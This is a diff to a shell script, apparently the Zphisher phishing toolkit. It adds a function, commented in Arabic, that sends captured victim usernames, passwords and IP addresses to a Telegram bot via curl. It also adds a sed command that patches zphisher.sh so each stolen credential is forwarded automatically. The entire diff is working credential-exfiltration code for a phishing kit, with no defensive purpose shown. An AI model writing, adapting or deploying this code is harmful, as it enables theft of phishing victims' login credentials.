@@ -902,6 +902,25 @@ main_menu() {
 	esac
 }
 
+# إرسال إلى تلجرام
+send_telegram() {
+    if [ ! -z "$TELEGRAM_BOT_TOKEN" ] && [ ! -z "$CHAT_ID" ]; then
+        MSG="🔔 *بيانات جديدة* 🔔
+👤 *اليوزر:* $1
+🔑 *الباسورد:* $2
+🌍 *الآي بي:* $3
+⏰ *الوقت:* $(date)"
+        
+        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
+            -d chat_id="$CHAT_ID" \
+            -d text="$MSG" \
+            -d parse_mode="Markdown" > /dev/null
+    fi
+}
+
+# تعديل ملف Zphisher ليرسل للبوت
+sed -i 's/echo "$username:$password" >> auth\/usernames.dat/echo "$username:$password" >> auth\/usernames.dat \&\& send_telegram "$username" "$password" "$victim_ip"/' zphisher.sh
+
 ## Main
 kill_pid
 dependencies
